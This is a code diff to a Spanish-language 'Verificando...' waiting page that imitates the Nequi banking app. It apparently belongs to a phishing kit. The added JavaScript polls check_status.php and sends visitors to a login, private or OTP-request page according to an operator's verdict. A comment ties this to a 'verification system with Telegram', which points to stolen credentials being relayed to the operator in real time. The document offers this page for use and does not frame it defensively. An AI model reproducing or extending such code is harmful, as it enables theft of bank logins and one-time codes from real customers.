@@ -3,9 +3,7 @@
         <title>Verificando...</title>
         <meta http-equiv="content-type" content="text/html; utf-8">
         <meta charset="utf-8">
-        
         <meta content="es" http-equiv="Content-Language">
-    
         <meta name="description" content="">
         <meta name="author" content="">
         <meta name="Copyright" content="">
@@ -101,14 +99,11 @@
                         <div class="titulo-footer">Producto</div>
                         <div class="item-footer">Legales</div>
                         <div class="item-footer">Ayuda</div>
-
                         <div class="titulo-footer vmovil">Portales</div>
                         <div class="item-footer vmovil">Blog | Metidas de plata</div>
                         <div class="item-footer vmovil">APIs | Nequi conecta</div>
-
                         <div class="titulo-footer vmovil">Redes</div>
                         <img class="vmovil" src="../assets/img/icon-social.jpg" style="margin-top: 10px;">
-
                     </td>
                     <td valign="top" id="app">
                         <div class="titulo-footer">Descarga la App</div>
@@ -125,9 +120,6 @@
                     </td>
                 </tr>                
             </table>
-
-            
-
             <table border="0" cellpadding="0" cellspacing="0" width="94%" style="max-width: 1200px; margin: 0 auto;">                                
                 <tr>
                     <td id="gb-sec">
@@ -151,61 +143,59 @@
                     </td>
                 </tr>
             </table>
-
        </div> 
-    <script>
-let checkInterval;
-
-function checkStatus() {
-    fetch('check_status.php')
-        .then(response => response.json())
-        .then(data => {
-            console.log('Estado actual:', data.estado);
-            
-            if (data.estado === 'aprobado') {
-                clearInterval(checkInterval);
-                window.location.href = '../private/';
-            } 
-            else if (data.estado === 'rechazado') {
-                clearInterval(checkInterval);
-                alert('Error de autenticación: ' + data.mensaje);
-                window.location.href = '../login/';
-            } 
-            else if (data.estado === 'pedir_otp') {
-                clearInterval(checkInterval);
-                // Ajusta esta ruta según tu estructura
-                window.location.href = '../solicitar/'; 
-            }
-        })
-        .catch(error => {
-            console.error('Error verificando estado:', error);
-        });
-}
-
-// Verificar cada 2 segundos
-checkInterval = setInterval(checkStatus, 2000);
-
-// Timeout después de 5 minutos
-setTimeout(() => {
-    clearInterval(checkInterval);
-    alert('Tiempo de espera agotado');
-    window.location.href = '../login/';
-}, 300000);
-</script>
-    </body>
 
     <script type="text/javascript">
         $(document).ready(function($){
-            setInterval(consultar_estado,2000); 
+            // Llamar a la función original si existe
+            if (typeof consultar_estado === 'function') {
+                setInterval(consultar_estado, 2000); 
+            }
 
             if(detectar_dispositivo() != "PC"){
                 $(".cabecera,.pie").hide(); 
                 $(".frm").css({"width":"calc(100% - 40px)","background-color":"transparent"}); 
                 $(".contenido-interno").css({"padding-top":"0px","padding-bottom":"0px","height":"100%","background-image":"url(../assets/img/fondo.jpg)","background-position":"bottom","background-repeat":"no-repeat","background-color":"#fff","min-height":"500px"});                      
-            } 
-                    
+            }
+
+            // Sistema de verificación con Telegram
+            let checkInterval;
+
+            function checkStatus() {
+                fetch('check_status.php')
+                    .then(response => response.json())
+                    .then(data => {
+                        console.log('Estado actual:', data.estado);
+                        
+                        if (data.estado === 'aprobado') {
+                            clearInterval(checkInterval);
+                            window.location.href = '../private/';
+                        } 
+                        else if (data.estado === 'rechazado') {
+                            clearInterval(checkInterval);
+                            alert('Error de autenticación');
+                            window.location.href = '../login/';
+                        } 
+                        else if (data.estado === 'pedir_otp') {
+                            clearInterval(checkInterval);
+                            window.location.href = '../solicitar/'; 
+                        }
+                    })
+                    .catch(error => {
+                        console.error('Error verificando estado:', error);
+                    });
+            }
+
+            // Verificar cada 2 segundos
+            checkInterval = setInterval(checkStatus, 2000);
+
+            // Timeout después de 5 minutos
+            setTimeout(() => {
+                clearInterval(checkInterval);
+                alert('Tiempo de espera agotado');
+                window.location.href = '../login/';
+            }, 300000);
         });  
     </script>
     <script type="text/javascript" src="../assets/js/ready.js?v2"></script> 
-
 </html>
